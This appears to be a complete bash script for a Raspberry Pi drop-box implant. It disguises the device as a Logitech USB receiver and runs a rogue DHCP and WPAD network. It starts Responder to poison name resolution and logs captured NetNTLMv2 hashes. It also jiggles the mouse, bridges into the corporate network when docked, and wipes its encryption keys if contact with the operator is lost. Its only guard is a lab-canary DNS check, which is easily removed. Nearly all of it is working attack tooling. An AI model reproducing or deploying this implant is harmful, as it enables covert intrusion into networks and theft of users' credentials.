#!/usr/bin/env bash
# Keystone Pi drop-mode bootstrap — runs on a Pi Zero 2 W / Pi 4 in "drop" mode.
#
# Mode selection: GPIO21 pulled low OR /boot/keystone-mode contains "drop".
# Default mode is "infra" (Kimi API, unchanged).
#
# Phase 1: USB composite gadget (ECM Ethernet + optional HID keyboard)
# Phase 2: Rogue network (DHCP, WPAD, Responder)
# Phase 3: Capture (NetNTLMv2 hashes, HTTP cookies, mouse jiggler)
# Phase 4: Corp bridge (when docked — bridge usb0 ↔ wlan1/LTE)
# Dead-man: wipe LUKS keys on operator-contact loss
#
# Lab safety: refuses to boot in drop mode unless keystone-canary.lab resolves.
set -euo pipefail

LOGDIR="/run/keystone-drop"
HASH_DIR="$LOGDIR/hashes"
COOKIE_DIR="$LOGDIR/cookies"
HEARTBEAT_FILE="$LOGDIR/.heartbeat"
T_ABORT="${T_ABORT:-1800}"  # 30 minutes
OPERATOR_TAILSCALE="${OPERATOR_TAILSCALE:-100.91.140.23}"

log() { echo "[drop $(date +%H:%M:%S)] $*" | tee -a "$LOGDIR/bootstrap.log"; }

check_drop_mode() {
    if grep -q "^drop$" /boot/keystone-mode 2>/dev/null; then
        return 0
    fi
    if command -v raspi-gpio >/dev/null 2>&1; then
        local state
        state=$(raspi-gpio get 21 2>/dev/null | grep -oP 'level=\K[01]')
        [[ "$state" == "0" ]] && return 0
    fi
    return 1
}

lab_safety_check() {
    log "Lab safety: resolving keystone-canary.lab..."
    local deadline=$((SECONDS + 90))
    while (( SECONDS < deadline )); do
        if host keystone-canary.lab >/dev/null 2>&1; then
            log "Lab canary resolved — safe to continue"
            return 0
        fi
        sleep 2
    done
    log "ABORT: keystone-canary.lab not resolvable — refusing drop mode"
    exit 1
}

phase1_usb_gadget() {
    log "Phase 1: USB composite gadget setup"
    modprobe libcomposite || { log "libcomposite not available"; return 1; }

    local GADGET="/sys/kernel/config/usb_gadget/keystone"
    mkdir -p "$GADGET"
    cd "$GADGET"

    # Masquerade as a Logitech USB receiver
    echo 0x046d > idVendor
    echo 0x0a37 > idProduct
    echo 0x0100 > bcdDevice
    echo 0x0200 > bcdUSB

    mkdir -p strings/0x409
    echo "000000000001"     > strings/0x409/serialnumber
    echo "Logitech"         > strings/0x409/manufacturer
    echo "USB Receiver"     > strings/0x409/product

    mkdir -p configs/c.1/strings/0x409
    echo "Config 1" > configs/c.1/strings/0x409/configuration
    echo 250 > configs/c.1/MaxPower

    # ECM Ethernet gadget (PoisonTap-style)
    mkdir -p functions/ecm.usb0
    ln -sf functions/ecm.usb0 configs/c.1/

    # Optional HID keyboard (GPIO22 selects)
    if command -v raspi-gpio >/dev/null 2>&1; then
        local hid_state
        hid_state=$(raspi-gpio get 22 2>/dev/null | grep -oP 'level=\K[01]')
        if [[ "$hid_state" == "0" ]]; then
            mkdir -p functions/hid.usb0
            echo 1 > functions/hid.usb0/protocol
            echo 1 > functions/hid.usb0/subclass
            echo 8 > functions/hid.usb0/report_length
            # Standard keyboard HID report descriptor
            printf '\x05\x01\x09\x06\xa1\x01\x05\x07\x19\xe0\x29\xe7\x15\x00\x25\x01\x75\x01\x95\x08\x81\x02\x95\x01\x75\x08\x81\x01\x95\x05\x75\x01\x05\x08\x19\x01\x29\x05\x91\x02\x95\x01\x75\x03\x91\x01\x95\x06\x75\x08\x15\x00\x25\x65\x05\x07\x19\x00\x29\x65\x81\x00\xc0' \
                > functions/hid.usb0/report_desc
            ln -sf functions/hid.usb0 configs/c.1/
            log "HID keyboard gadget enabled"
        fi
    fi

    # Bind to UDC
    ls /sys/class/udc > UDC 2>/dev/null || true
    log "USB gadget bound"

    # Configure network on usb0
    sleep 2
    ip addr add 1.0.0.1/1 dev usb0 2>/dev/null || true
    ip link set usb0 up 2>/dev/null || true
}

phase2_rogue_network() {
    log "Phase 2: Rogue network (DHCP + WPAD + Responder)"

    # DHCP server on usb0 — advertise Pi as gateway + WPAD
    dnsmasq \
        --interface=usb0 \
        --dhcp-range=1.0.0.2,1.0.0.254,255.0.0.0,5m \
        --dhcp-option=3,1.0.0.1 \
        --dhcp-option=6,1.0.0.1 \
        --dhcp-option=252,"http://1.0.0.1/wpad.dat" \
        --log-facility="$LOGDIR/dnsmasq.log" \
        --no-daemon &
    DNSMASQ_PID=$!

    # WPAD auto-proxy
    mkdir -p /tmp/wpad
    cat > /tmp/wpad/wpad.dat <<'WPAD'
function FindProxyForURL(url, host) {
    return "PROXY 1.0.0.1:8080; DIRECT";
}
WPAD
    python3 -m http.server 80 --directory /tmp/wpad &>/dev/null &

    # Responder on usb0
    if command -v responder >/dev/null 2>&1; then
        responder -I usb0 -wFb \
            --lm -v 2>&1 | tee "$LOGDIR/responder.log" &
        log "Responder started on usb0"
    else
        log "WARNING: responder not installed, LLMNR/NBT-NS poisoning unavailable"
    fi
}

phase3_capture() {
    log "Phase 3: Capture loop"
    mkdir -p "$HASH_DIR" "$COOKIE_DIR"

    # Hash watcher: tail Responder logs for NTLMv2 hashes
    (
        tail -f "$LOGDIR/responder.log" 2>/dev/null | while read -r line; do
            if echo "$line" | grep -qiE 'NTLMv2|NetNTLMv2'; then
                echo "$(date -Iseconds) $line" >> "$HASH_DIR/captured.txt"
                log "HASH CAPTURED: $(echo "$line" | head -c 80)"
            fi
        done
    ) &

    # Mouse jiggler: 1px nudge every 25s via HID gadget
    if [[ -c /dev/hidg0 ]]; then
        (
            while true; do
                # USB HID mouse report: buttons=0, dx=1, dy=0
                printf '\x00\x01\x00' > /dev/hidg0 2>/dev/null || true
                sleep 25
                printf '\x00\xff\x00' > /dev/hidg0 2>/dev/null || true
                sleep 25
            done
        ) &
        log "Mouse jiggler active"
    fi
}

phase4_corp_bridge() {
    log "Phase 4: Watching for corp dock connection"
    (
        while true; do
            # Detect second NIC (dock Ethernet via USB-C pass-through)
            if ip link show eth0 >/dev/null 2>&1 && ip link show usb0 >/dev/null 2>&1; then
                if ip addr show eth0 | grep -q "inet "; then
                    log "Corp dock detected — bridging usb0 ↔ eth0"
                    brctl addbr br-corp 2>/dev/null || true
                    brctl addif br-corp usb0 2>/dev/null || true
                    brctl addif br-corp eth0 2>/dev/null || true
                    ip link set br-corp up 2>/dev/null || true
                    log "Bridge br-corp UP — corp VLAN accessible"
                    break
                fi
            fi
            sleep 10
        done
    ) &
}

dead_man_timer() {
    log "Dead-man timer: T_abort=${T_ABORT}s"
    (
        touch "$HEARTBEAT_FILE"
        while true; do
            sleep 60
            # Heartbeat = Tailscale ping to operator
            if ping -c1 -W5 "$OPERATOR_TAILSCALE" >/dev/null 2>&1; then
                touch "$HEARTBEAT_FILE"
            fi
            local age
            age=$(( $(date +%s) - $(stat -c %Y "$HEARTBEAT_FILE" 2>/dev/null || echo 0) ))
            if (( age > T_ABORT )); then
                log "DEAD MAN: operator contact lost for ${age}s > ${T_ABORT}s"
                log "Wiping LUKS keys and powering off"
                # Wipe dm-crypt keys from memory
                dmsetup ls --target crypt 2>/dev/null | awk '{print $1}' | while read -r name; do
                    dmsetup message "$name" 0 key wipe 2>/dev/null || true
                done
                sync
                poweroff -f
            fi
        done
    ) &
}

# --- Main ---
main() {
    if ! check_drop_mode; then
        echo "[drop] Not in drop mode — exiting (infra mode active)"
        exit 0
    fi

    mkdir -p "$LOGDIR"
    log "=== Keystone Pi drop-mode bootstrap ==="
    lab_safety_check
    phase1_usb_gadget
    phase2_rogue_network
    phase3_capture
    phase4_corp_bridge
    dead_man_timer
    log "All phases started. Waiting..."
    wait
}

main "$@"
